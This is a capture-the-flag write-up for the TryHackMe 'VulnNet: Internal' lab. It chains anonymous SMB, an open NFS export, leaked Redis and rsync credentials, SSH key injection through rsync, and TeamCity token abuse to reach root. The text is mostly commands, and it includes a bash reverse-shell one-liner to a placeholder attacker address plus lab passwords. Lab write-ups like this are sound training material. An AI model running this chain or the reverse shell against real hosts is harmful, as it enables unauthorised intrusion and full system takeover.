# VulnNet: Internal - TryHackMe Writeup

**Target:** `TARGET_IP` (10.128.153.142 at time of solve)
**OS:** Linux
**Difficulty:** Easy (plays like Medium Â— multi-protocol pivot)

---

## Attack Chain Overview

```
Port Discovery (22, 111, 139, 445, 873 rsync, 2049 NFS, 6379 Redis, ephemeral)
    ?
Anonymous SMB ? \shares readable ? services flag
    ?
NFS: showmount -e ? /opt/conf world-exported ? mount
    ?
grep secrets in NFS mount ? Redis requirepass "B65Hx562F@ggAZ@F"
    ?
redis-cli AUTH ? KEYS * ? GET "internal flag" + LRANGE authlist ? base64 ? rsync creds
    ?
rsync read rsync://rsync-connect@target/files ? sys-internal user dir (user flag)
    ?
ssh-keygen ? rsync WRITE of authorized_keys into sys-internal/.ssh
    ?
SSH as sys-internal ? local TeamCity on 127.0.0.1:8111 as root
    ?
ssh -L 8111:localhost:8111 ? access TeamCity UI
    ?
Find super-user token in /TeamCity/logs/catalina.out
    ?
TeamCity UI as super user ? build step Command Line ? reverse shell as root
    ?
Root Flag
```

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [SMB Anonymous Share](#smb-anonymous-share)
3. [NFS Share Enumeration](#nfs-share-enumeration)
4. [Redis Authentication & Enumeration](#redis-authentication--enumeration)
5. [rsync Read ? sys-internal Home](#rsync-read--sys-internal-home)
6. [rsync Write ? SSH Key Injection](#rsync-write--ssh-key-injection)
7. [User Foothold as sys-internal](#user-foothold-as-sys-internal)
8. [Local Service Discovery Â— TeamCity](#local-service-discovery--teamcity)
9. [SSH Port Forwarding to TeamCity UI](#ssh-port-forwarding-to-teamcity-ui)
10. [TeamCity Super User Token ? RCE](#teamcity-super-user-token--rce)
11. [Root Flag](#root-flag)
12. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Port Discovery
```bash
export TARGET=10.128.153.142
# What it does: run a fast port discovery scan on the target.
# Why here: identify the wide attack surface including NFS, SMB, rsync, and Redis for further service enumeration.
nmap -sS -p- --min-rate 5000 -n $TARGET
```

```bash
# What it does: perform deep service and version enumeration on the discovered ports.
# Why here: extract version banners and script results to prioritize the next steps in the exploitation chain.
nmap -sVC -p22,111,139,445,873,2049,6379,45713,46991,49585,53297 $TARGET -oA service-scan
```

| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH | OpenSSH |
| 111 / 2049 | rpcbind + NFS | Check `showmount` |
| 139 / 445 | SMB | Check anonymous shares |
| 873 | rsync | Daemon-mode, look for modules |
| 6379 | Redis | Requires auth probably |
| 45713+ | NFS dynamic / misc RPC | Accompany 2049 |

---

## SMB Anonymous Share

```bash
# What it does: perform automated SMB and RPC enumeration on the target.
# Why here: check for anonymous access, discover domain users, and list available shares.
enum4linux -a $TARGET
```

The relevant line is the `shares` enumeration Â— `\shares` is listed READ. No credentials needed.

```bash
# What it does: list and interact with SMB shares on the target.
# Why here: confirm anonymous access to the 'shares' resource and extract the initial services flag.
smbclient -N -L //$TARGET/
smbclient -N //$TARGET/shares
smbclient -N //$TARGET/shares -c 'recurse ON; prompt OFF; mget *'
```

Inside is a **services flag** Â— the first of several in the box.

---

## NFS Share Enumeration

```bash
# What it does: query the target for available NFS exports.
# Why here: identify if the /opt/conf share is exported with weak host restrictions.
showmount -e $TARGET
```

Output:
```
/opt/conf   *
```

The `*` wildcard means **any host can mount it** Â— no export restrictions.

### Mount locally
```bash
# What it does: create a local mount point for the NFS share.
# Why here: prepare a workspace to map the remote /opt/conf directory.
sudo mkdir -p /mnt/nfs_conf
# What it does: mount the remote NFS share to the local filesystem.
# Why here: allow for direct file enumeration and searching for sensitive configuration data.
sudo mount -t nfs $TARGET:/opt/conf /mnt/nfs_conf
# What it does: list the contents of the mounted NFS configuration directory.
# Why here: confirm the mount was successful and check for sensitive configuration files like redis.conf.
ls -la /mnt/nfs_conf
```

### Credential hunt on the mount
```bash
# What it does: search recursively for credentials and secrets within the NFS mount.
# Why here: recover the Redis authentication password to pivot into the database.

grep -rEi "pass|key|secret|token" /mnt/nfs_conf/ 2>/dev/null
```

Hit on `redis.conf`:
```
requirepass "B65Hx562F@ggAZ@F"
```

---

## Redis Authentication & Enumeration

### Authenticate
```bash
# What it does: authenticate to the Redis server using the discovered password.
# Why here: gain access to the Redis datastore to extract further credentials and flags.
redis-cli -h $TARGET -a 'B65Hx562F@ggAZ@F'
```

### Enumerate
```
127.0.0.1:6379> INFO
127.0.0.1:6379> KEYS *
```

Interesting keys include an `internal flag` value and a list named `authlist`.

### Grab the internal flag
```
127.0.0.1:6379> GET "internal flag"
```

### Walk the authlist
```
127.0.0.1:6379> LRANGE "authlist" 0 -1
```

One entry is a base64 blob. Decode it on the attacker:
```bash
# What it does: decode the base64-encoded string found in the Redis 'authlist'.
# Why here: convert the encoded credentials into the plaintext rsync password.
echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
```

```
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

(Note: the original log message truncates the final `v` in some copies Â— include it.)

---

## rsync Read ? sys-internal Home

rsync is running in daemon mode on port 873 with modules defined in `rsyncd.conf`. The credential above authenticates to the `files` module.

### Prepare a password file
```bash
# What it does: save the rsync password to a local file.
# Why here: provide the password to rsync via the --password-file option for automated transfers.
echo "Hcg3HP67@TW@Bc72v" > /tmp/rsync.pass
# What it does: set restrictive permissions on the password file.
# Why here: ensure the file is only readable by the current user, as required by rsync for security.
chmod 600 /tmp/rsync.pass
```

### List modules (optional, confirms `files`)
```bash
# What it does: list available rsync modules on the target.
# Why here: confirm the presence of the 'files' module identified in the Redis leak.
rsync --list-only rsync://$TARGET/
```

### Mirror the module locally
```bash
# What it does: mirror the contents of the 'files' rsync module to the local machine.
# Why here: exfiltrate the sys-internal home directory for offline enumeration and flag recovery.
rsync -av --password-file=/tmp/rsync.pass \
  rsync-connect@$TARGET::files ./rsync_files/
```

### Locate the user flag
```bash
# What it does: search the mirrored rsync files for text-based flags or configuration.
# Why here: find the user flag and other sensitive documentation in the exfiltrated home directory.
find ./rsync_files -type f -iname "*.txt"
# What it does: read the user flag from the mirrored sys-internal directory.
# Why here: capture the user milestone once the rsync exfiltration is complete.
cat ./rsync_files/sys-internal/user.txt        # path varies
```

The `sys-internal/` subtree mirrors the user's home. `.ssh/` is writable through the same module Â— we will abuse that next.

---

## rsync Write ? SSH Key Injection

### Generate an SSH keypair locally
```bash
# What it does: generate a new SSH RSA keypair.
# Why here: create a public/private key pair to inject into the target's authorized_keys for SSH access.
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa_vulnnet -N ""
```

### Stage the pubkey as an `authorized_keys` file
```bash
# What it does: prepare the local public key for rsync upload.
# Why here: name the key 'authorized_keys' to match the SSH service's default lookup file.
cp ~/.ssh/id_rsa_vulnnet.pub ./authorized_keys
```

### Push it into the target's `sys-internal/.ssh/`
```bash
# What it does: upload the local authorized_keys file to the target's .ssh directory via rsync.
# Why here: gain persistent SSH access as the sys-internal user by injecting a controlled public key.
rsync --password-file=/tmp/rsync.pass authorized_keys \
  rsync://rsync-connect@$TARGET/files/sys-internal/.ssh/
```

The module is writable Â— rsync accepts the upload without a credential for write (the module auth above is sufficient).

---

## User Foothold as sys-internal

```bash
# What it does: establish an SSH session using the injected RSA private key.
# Why here: obtain a stable interactive foothold on the target as the sys-internal user.
ssh -i ~/.ssh/id_rsa_vulnnet sys-internal@$TARGET
```

```
sys-internal@vulnnet-internal:~$ id
uid=1000(sys-internal) gid=1000(sys-internal) groups=1000(sys-internal)
sys-internal@vulnnet-internal:~$ cat user.txt
```

---

## Local Service Discovery Â— TeamCity

Baseline enumeration:
```bash
id
groups
# What it does: check if the sys-internal user has any administrative privileges.
# Why here: identify potential sudo misconfigurations that could bypass the TeamCity pivot.
sudo -l
# What it does: filters text with the specified pattern.
# Why here: extract the important clue from a large output.
ps auxf | grep -Ei "teamcity|java|root"
ss -tulpn
```

Two local-only listeners stand out:
```
LISTEN 127.0.0.1:8111   (TeamCity Server, running as root)
LISTEN 127.0.0.1:9090   (TeamCity Build Agent)
```

Review the build agent config:
```bash
# What it does: read the TeamCity Build Agent properties.
# Why here: search for hardcoded secrets or tokens that might grant access to the internal CI/CD management.
cat ./buildAgent/conf/buildAgent.properties
```

It includes an `authorizationToken` (agent-level, not useful for the UI):
```
authorizationToken=b441ad5edaf61a90da0969cb9a2b4079
```

The UI needs a **super user token** Â— printed in TeamCity's main log on every server start.

---

## SSH Port Forwarding to TeamCity UI

From the attacker, exit the interactive shell (or open a second terminal) and forward both ports:

```bash
# What it does: open an SSH session with local port forwarding.
# Why here: tunnel the local TeamCity ports (8111 and 9090) to the attacker's machine for UI access.
ssh -i ~/.ssh/id_rsa_vulnnet \
    -L 8111:localhost:8111 \
    -L 9090:localhost:9090 \
    sys-internal@$TARGET
```

Now `http://localhost:8111/` renders the TeamCity login.

---

## TeamCity Super User Token ? RCE

### Locate the super-user token in logs
```bash
sudo -n true 2>/dev/null || true
# What it does: search the TeamCity log directory for the super-user authentication token.
# Why here: recover the administrative credentials needed to access the web-based build management UI.
find /TeamCity/logs -type f -exec grep -l "Super user" {} \; 2>/dev/null
# What it does: read the catalina.out log file to extract the super-user token.
# Why here: confirm the exact token value for immediate authentication to the TeamCity instance.
cat /TeamCity/logs/catalina.out | grep -A1 -i "super user"
```

Sample line:
```
Super user authentication token: 2181062568204067727
```

### Authenticate to the UI
Open `http://localhost:8111/login.html?super=1` (or use the login field: empty username, token as password).

### Build a Command Line step that runs as root

TeamCity builds run as the process owner of the agent Â— the agent is started by the server, which runs as root on this host.

1. _Projects_ ? _Create project_ ? name `Prueba`, ID `Prueba`.
2. Inside, _Create build configuration_ ? name `ReverseShell`.
3. _Build Steps_ ? _Add build step_ ?
   - Runner type: **Command Line**
   - Step name: `Reverse Shell`
   - Execute: **Custom script**
   - Script:
     ```bash
     bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
     ```
4. _Agents_ ? confirm `Default Agent` is _Authorized_.

### Catch the shell
Listener on the attacker:
```bash
# What it does: open a netcat listener to capture the reverse shell callback.
# Why here: receive the administrative shell from the TeamCity build step execution.
nc -lvnp 4444
```

### Fire the build
Back in TeamCity UI ? _ReverseShell_ ? **Run**.

The agent executes the script **as root** ? callback lands on `nc`:
```
id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Root Flag

```bash
# What it does: read the final root flag.
# Why here: complete the machine compromise after successfully escalating to root via TeamCity.
cat /root/root.txt
```

---

## Key Takeaways

| Stage | Technique | Key Detail |
|-------|-----------|------------|
| **Recon** | SMB + NFS + rsync + Redis on one host | Every service enumerated separately yielded something |
| **Initial leak** | Anonymous SMB share | Services flag + orientation |
| **Config disclosure** | Unrestricted NFS export (`*`) | `/opt/conf` contained Redis master password |
| **Datastore abuse** | Authenticated Redis `LRANGE` | `authlist` list stored base64 of rsync creds |
| **Lateral movement** | rsync module abuse (read + write) | Pushed `authorized_keys` into `sys-internal/.ssh/` |
| **Service discovery** | `ss -tulpn` loopback listeners | TeamCity 8111 / 9090 running as root |
| **Pivoting** | SSH `-L` port forwarding | Exposed loopback UI to attacker |
| **RCE** | TeamCity super-user token in log | Build step with Command Line runner ? root |

### Security Lessons

1. **Do not export NFS with `*` wildcard** Â— always use `rw,host-list` with explicit IPs or subnets.
2. **Redis is not a secure keystore for secrets** Â— `LRANGE` and `KEYS *` show everything to anyone with AUTH access.
3. **rsync modules default to readable/writeable** Â— set `read only = yes` in `rsyncd.conf` unless intentionally shared for write, and always require secrets for both directions.
4. **TeamCity super user tokens print to the main log** Â— log files must be readable only by service accounts.
5. **Build agents inherit the server's privileges** Â— running TeamCity as root means every build step is root RCE.

### Related Notes
- [ftp](../../../tools/recon/ftp.md) / [smbclient](../../../tools/recon/smbclient.md) / [enum4linux](../../../tools/recon/enum4linux.md) Â— initial SMB triage
- [showmount + NFS abuse playbook](../../../exploits/network-services/nfs-share-abuse.md)
- [Redis authenticated enumeration](../../../exploits/network-services/redis-auth-abuse.md)
- [rsync module read/write abuse](../../../exploits/network-services/rsync-module-abuse.md)
- [TeamCity super-user token RCE](../../../exploits/ci-cd/teamcity-superuser-token-rce.md)
- [SSH port forwarding](../../../techniques/pivot/ssh-tunneling.md)
- [Linux enumeration playbook](../../../playbooks/enumeration/linux.md)
